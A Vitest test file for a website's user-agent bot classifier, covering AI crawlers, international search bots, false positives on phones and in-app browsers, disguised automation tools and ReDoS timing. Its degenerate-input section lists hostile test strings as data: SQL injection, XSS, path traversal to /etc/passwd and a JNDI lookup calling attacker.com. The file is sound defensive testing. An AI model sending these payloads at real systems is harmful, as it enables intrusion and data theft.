import { describe, it, expect } from "vitest";
import {
  classifyUserAgent,
  isBot,
  getBotCategory,
  formatBotCategoryLabel,
} from "../src/lib/visit-utils";

describe("Milestone 1 Challenger 1: Adversarial User-Agent Stress Testing", () => {
  // =========================================================================
  // 1. Obscure AI Crawlers & LLM Bots
  // =========================================================================
  describe("1. Obscure AI Crawlers & Emerging LLM Bots", () => {
    it("classifies Diffbot AI crawler as AI_CRAWLER", () => {
      const ua = "Mozilla/5.0 (compatible; Diffbot/0.1; +http://www.diffbot.com)";
      const res = classifyUserAgent(ua);
      expect(res.isBot).toBe(true);
      expect(res.category).toBe("AI_CRAWLER");
      expect(res.botName).toBe("Diffbot");
    });

    it("classifies Cohere AI crawler (standalone and Mozilla prefixed) as AI_CRAWLER", () => {
      const ua1 = "cohere-ai/1.0";
      const res1 = classifyUserAgent(ua1);
      expect(res1.isBot).toBe(true);
      expect(res1.category).toBe("AI_CRAWLER");
      expect(res1.botName).toBe("Cohere-ai");

      const ua2 = "Mozilla/5.0 (compatible; cohere-ai; +https://cohere.com)";
      const res2 = classifyUserAgent(ua2);
      expect(res2.isBot).toBe(true);
      expect(res2.category).toBe("AI_CRAWLER");
      expect(res2.botName).toBe("Cohere-ai");
    });

    it("classifies OpenAI SearchBot (OAI-SearchBot) as AI_CRAWLER", () => {
      const ua = "Mozilla/5.0 (compatible; OAI-SearchBot/1.0; +https://openai.com/searchbot)";
      const res = classifyUserAgent(ua);
      expect(res.isBot).toBe(true);
      expect(res.category).toBe("AI_CRAWLER");
      expect(res.botName).toBe("OAI-SearchBot");
    });

    it("classifies ImagesiftBot as AI_CRAWLER", () => {
      const ua = "ImagesiftBot/1.0 (+http://imagesift.com)";
      const res = classifyUserAgent(ua);
      expect(res.isBot).toBe(true);
      expect(res.category).toBe("AI_CRAWLER");
      expect(res.botName).toBe("ImagesiftBot");
    });

    it("classifies Meta-ExternalAgent and Meta-ExternalFetcher as AI_CRAWLER", () => {
      const uaAgent = "Meta-ExternalAgent/1.0 (+https://developers.facebook.com/docs/sharing/webmasters/crawler)";
      const resAgent = classifyUserAgent(uaAgent);
      expect(resAgent.isBot).toBe(true);
      expect(resAgent.category).toBe("AI_CRAWLER");
      expect(resAgent.botName).toBe("Meta-ExternalAgent");

      const uaFetcher = "Meta-ExternalFetcher/1.0";
      const resFetcher = classifyUserAgent(uaFetcher);
      expect(resFetcher.isBot).toBe(true);
      expect(resFetcher.category).toBe("AI_CRAWLER");
      expect(resFetcher.botName).toBe("Meta-ExternalAgent");
    });

    it("classifies ByteDance Bytespider as AI_CRAWLER", () => {
      const ua = "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)";
      const res = classifyUserAgent(ua);
      expect(res.isBot).toBe(true);
      expect(res.category).toBe("AI_CRAWLER");
      expect(res.botName).toBe("Bytespider");
    });

    it("prioritizes Applebot-Extended as AI_CRAWLER over standard search Applebot", () => {
      const ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 (Applebot-Extended/0.1; +http://www.apple.com/go/applebot)";
      const res = classifyUserAgent(ua);
      expect(res.isBot).toBe(true);
      expect(res.category).toBe("AI_CRAWLER");
      expect(res.botName).toBe("Applebot-Extended");
    });
  });

  // =========================================================================
  // 2. International Search Engine Crawlers
  // =========================================================================
  describe("2. Rare Search Bots & International Crawlers", () => {
    it("classifies Baiduspider desktop and mobile variants as SEARCH_BOT", () => {
      const desktop = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)";
      const resDesktop = classifyUserAgent(desktop);
      expect(resDesktop.isBot).toBe(true);
      expect(resDesktop.category).toBe("SEARCH_BOT");
      expect(resDesktop.botName).toBe("Baiduspider");

      const mobile = "Mozilla/5.0 (Linux; u; Android 4.2.2; zh-cn; Mobile) AppleWebKit/534.46 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.46 Baiduspider-render/2.0";
      const resMobile = classifyUserAgent(mobile);
      expect(resMobile.isBot).toBe(true);
      expect(resMobile.category).toBe("SEARCH_BOT");
      expect(resMobile.botName).toBe("Baiduspider");
    });

    it("classifies YandexBot and YandexMobileBot as SEARCH_BOT", () => {
      const ua1 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)";
      const res1 = classifyUserAgent(ua1);
      expect(res1.isBot).toBe(true);
      expect(res1.category).toBe("SEARCH_BOT");
      expect(res1.botName).toBe("YandexBot");

      const ua2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexMobileBot/3.0; +http://yandex.com/bots)";
      const res2 = classifyUserAgent(ua2);
      expect(res2.isBot).toBe(true);
      expect(res2.category).toBe("SEARCH_BOT");
      expect(res2.botName).toBe("YandexBot");
    });

    it("classifies Sogou web and pic spiders as SEARCH_BOT", () => {
      const web = "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webspider.htm)";
      const resWeb = classifyUserAgent(web);
      expect(resWeb.isBot).toBe(true);
      expect(resWeb.category).toBe("SEARCH_BOT");
      expect(resWeb.botName).toBe("Sogou");

      const pic = "Sogou pic spider/3.0";
      const resPic = classifyUserAgent(pic);
      expect(resPic.isBot).toBe(true);
      expect(resPic.category).toBe("SEARCH_BOT");
      expect(resPic.botName).toBe("Sogou");
    });

    it("classifies European Qwantify search crawler as SEARCH_BOT", () => {
      const ua = "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)";
      const res = classifyUserAgent(ua);
      expect(res.isBot).toBe(true);
      expect(res.category).toBe("SEARCH_BOT");
      expect(res.botName).toBe("Qwantify");
    });
  });

  // =========================================================================
  // 3. Benign Device Collisions (CUBOT, Turbot, etc.)
  // =========================================================================
  describe("3. Benign Device Collisions & Substring Safety", () => {
    it("does NOT classify CUBOT smartphone variants as bots", () => {
      const cubotModels = [
        "Mozilla/5.0 (Linux; Android 10; CUBOT_X30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; CUBOT X50 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; CUBOT_KINGKONG_MINI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; CUBOT P50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; CUBOT NOTE 50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; CUBOT_NOVA Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; CUBOT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; CUBOT-QUEST) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
      ];

      for (const ua of cubotModels) {
        const res = classifyUserAgent(ua);
        expect(res.isBot, `CUBOT model falsely flagged as bot: ${ua}`).toBe(false);
        expect(res.category).toBe("BROWSER");
      }
    });

    it("does NOT classify dictionary words containing 'bot' (turbot, robotics, bottleneck) as bots", () => {
      const dictionaryUAs = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 TurbotApp/1.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36 (RoboticsDepartment)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36 BottleneckTester/1.0",
      ];

      for (const ua of dictionaryUAs) {
        const res = classifyUserAgent(ua);
        expect(res.isBot, `Benign word falsely flagged as bot: ${ua}`).toBe(false);
        expect(res.category).toBe("BROWSER");
      }
    });
  });

  // =========================================================================
  // 4. Adversarial & Deceptive Bot User-Agents
  // =========================================================================
  describe("4. Deceptive Crawlers Disguised with Chrome/Safari Signatures", () => {
    it("detects Googlebot smartphone disguised as Android Chrome", () => {
      const ua = "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
      const res = classifyUserAgent(ua);
      expect(res.isBot).toBe(true);
      expect(res.category).toBe("SEARCH_BOT");
      expect(res.botName).toBe("Googlebot");
    });

    it("detects HeadlessChrome and Chrome-Lighthouse disguised as real Chrome", () => {
      const headless = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.94 Safari/537.36";
      const resHeadless = classifyUserAgent(headless);
      expect(resHeadless.isBot).toBe(true);
      expect(resHeadless.category).toBe("SCRAPER_TOOL");
      expect(resHeadless.botName).toBe("HeadlessChrome");

      const lighthouse = "Mozilla/5.0 (Linux; Android 11; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 Chrome-Lighthouse";
      const resLighthouse = classifyUserAgent(lighthouse);
      expect(resLighthouse.isBot).toBe(true);
      expect(resLighthouse.category).toBe("SCRAPER_TOOL");
      expect(resLighthouse.botName).toBe("Lighthouse");
    });

    it("detects automation tools (Puppeteer, Playwright, Selenium) wrapped in Chrome signatures", () => {
      const puppeteer = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Puppeteer Chrome/122.0 Safari/537.36";
      const resPuppeteer = classifyUserAgent(puppeteer);
      expect(resPuppeteer.isBot).toBe(true);
      expect(resPuppeteer.category).toBe("SCRAPER_TOOL");

      const playwright = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Playwright Chrome/122.0 Safari/537.36";
      const resPlaywright = classifyUserAgent(playwright);
      expect(resPlaywright.isBot).toBe(true);
      expect(resPlaywright.category).toBe("SCRAPER_TOOL");

      const selenium = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36 (webdriver; Selenium)";
      const resSelenium = classifyUserAgent(selenium);
      expect(resSelenium.isBot).toBe(true);
      expect(resSelenium.category).toBe("SCRAPER_TOOL");
    });

    // ADVERSARIAL FINDING: Standalone bot token disguised in browser signature
    it("CHALLENGE FINDING: crawler explicitly declaring '(compatible; bot/1.0)' in Chrome signature MUST be detected as bot", () => {
      const deceptiveBotUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 (compatible; bot/1.0; +http://example.com/bot)";
      const res = classifyUserAgent(deceptiveBotUa);

      // In a strict classifier, declaring (compatible; bot/1.0) must be flagged as a bot, not BROWSER.
      // If classifier returns isBot: false, this marks a false negative vulnerability.
      expect(res.isBot, "Adversarial crawler declaring 'bot/1.0' inside Chrome signature evaded bot classification").toBe(true);
    });
  });

  // =========================================================================
  // 5. False Positive Challenges on Major Legitimate Mobile Browsers
  // =========================================================================
  describe("5. False Positive Challenges on Legitimate Mobile Browsers", () => {
    // ADVERSARIAL FINDING: DuckDuckGo Privacy Browser false positive
    it("CHALLENGE FINDING: DuckDuckGo Privacy Browser on iOS & Android must NOT be classified as DuckDuckBot", () => {
      const ddgIOS = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7 Safari/605.1.15";
      const resIOS = classifyUserAgent(ddgIOS);

      // DuckDuckGo Mobile Browser is a legitimate consumer browser used by human shoppers.
      // It should NOT be classified as DuckDuckBot SEARCH_BOT.
      expect(resIOS.isBot, "DuckDuckGo iOS mobile browser was falsely classified as a search bot").toBe(false);
      expect(resIOS.category).toBe("BROWSER");

      const ddgAndroid = "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36 DuckDuckGo/5";
      const resAndroid = classifyUserAgent(ddgAndroid);
      expect(resAndroid.isBot, "DuckDuckGo Android mobile browser was falsely classified as a search bot").toBe(false);
      expect(resAndroid.category).toBe("BROWSER");
    });

    // ADVERSARIAL FINDING: Pinterest In-App Browser false positive
    it("CHALLENGE FINDING: Pinterest mobile in-app browser must NOT be classified as Pinterestbot", () => {
      const pinterestIOS = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [Pinterest/iOS]";
      const res = classifyUserAgent(pinterestIOS);

      // Consumers discovering wedding and birthday cakes on Pinterest open links in the Pinterest in-app browser.
      // It must NOT be classified as Pinterestbot SEARCH_BOT.
      expect(res.isBot, "Pinterest in-app browser was falsely classified as Pinterestbot").toBe(false);
      expect(res.category).toBe("BROWSER");
    });
  });

  // =========================================================================
  // 6. Degenerate Inputs & Fuzzing Stress Test
  // =========================================================================
  describe("6. Degenerate Inputs, ReDoS Defense & Fuzzing", () => {
    it("handles degenerate null, undefined, empty, and whitespace strings without throwing", () => {
      const cases = [null, undefined, "", "   ", "\t\r\n", " \n \t "];
      for (const ua of cases) {
        expect(() => {
          const res = classifyUserAgent(ua);
          expect(res.isBot).toBe(true);
          expect(res.category).toBe("SCRAPER_TOOL");
        }).not.toThrow();
      }
    });

    it("handles binary null bytes, Unicode emojis, and bidirectional override characters safely", () => {
      const weirdUas = [
        "\0",
        "\0\0\0",
        "🎂🍰🧁 luxury cake patron 🍩🍪",
        "Mozilla/5.0 🎂 (Macintosh; Intel Mac OS X) Chrome/120.0 Safari/537.36",
        "\u202E reversed bot payload \u202D",
        "Mozilla/5.0 \u0000 Chrome/120.0",
      ];

      for (const ua of weirdUas) {
        expect(() => {
          const res = classifyUserAgent(ua);
          expect(res).toBeDefined();
          expect(typeof res.isBot).toBe("boolean");
          expect(["BROWSER", "AI_CRAWLER", "SEARCH_BOT", "SCRAPER_TOOL"]).toContain(res.category);
        }).not.toThrow();
      }
    });

    it("handles injection strings (SQLi, XSS, Path Traversal, JNDI) safely as SCRAPER_TOOL", () => {
      const attacks = [
        "'; DROP TABLE \"Visit\"; --",
        "\"><script>alert('xss')</script>",
        "../../../../../../etc/passwd",
        "${jndi:ldap://attacker.com/a}",
        "{{7*7}}",
        "SELECT * FROM \"User\"",
      ];

      for (const ua of attacks) {
        const res = classifyUserAgent(ua);
        expect(res.isBot).toBe(true);
        expect(res.category).toBe("SCRAPER_TOOL");
      }
    });

    it("evaluates a 10,000-character payload in < 50ms without catastrophic regex backtracking (ReDoS)", () => {
      const payloads = [
        "A".repeat(10000),
        "Mozilla/5.0 " + "a".repeat(10000) + " Chrome/120.0 Safari/537.36",
        ("bot-".repeat(500) + "crawler-").repeat(10),
        ("Mozilla/5.0 (Windows; " + "X".repeat(500) + ") ").repeat(20),
      ];

      for (const payload of payloads) {
        const t0 = performance.now();
        const res = classifyUserAgent(payload);
        const duration = performance.now() - t0;

        expect(res).toBeDefined();
        expect(duration, `ReDoS risk: processing took ${duration.toFixed(2)}ms (>50ms)`).toBeLessThan(50);
      }
    });

    it("handles non-string primitives defensively if passed via TypeScript escape", () => {
      const nonStrings: unknown[] = [
        12345,
        {},
        [],
        true,
        false,
        () => "userAgent",
      ];

      for (const input of nonStrings) {
        expect(() => {
          const res = classifyUserAgent(input as string | null | undefined);
          expect(res.isBot).toBe(true);
          expect(res.category).toBe("SCRAPER_TOOL");
        }).not.toThrow();
      }
    });
  });

  // =========================================================================
  // 7. Helper Utility Consistency
  // =========================================================================
  describe("7. Helper Utility Consistency (isBot, getBotCategory, formatBotCategoryLabel)", () => {
    it("guarantees isBot and getBotCategory strictly mirror classifyUserAgent results", () => {
      const sampleUas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1)",
        "Mozilla/5.0 (compatible; GPTBot/1.2)",
        "curl/8.4.0",
        null,
        "",
      ];

      for (const ua of sampleUas) {
        const full = classifyUserAgent(ua);
        expect(isBot(ua)).toBe(full.isBot);
        expect(getBotCategory(ua)).toBe(full.category);
      }
    });

    it("formats human labels for all valid classification categories", () => {
      expect(formatBotCategoryLabel("BROWSER")).toBe("Normal User");
      expect(formatBotCategoryLabel("AI_CRAWLER")).toBe("AI Crawler");
      expect(formatBotCategoryLabel("SEARCH_BOT")).toBe("Search Bot");
      expect(formatBotCategoryLabel("SCRAPER_TOOL")).toBe("Scraper / Tool");
      // @ts-expect-error testing invalid fallback
      expect(formatBotCategoryLabel("UNKNOWN")).toBe("Unknown");
    });
  });
});
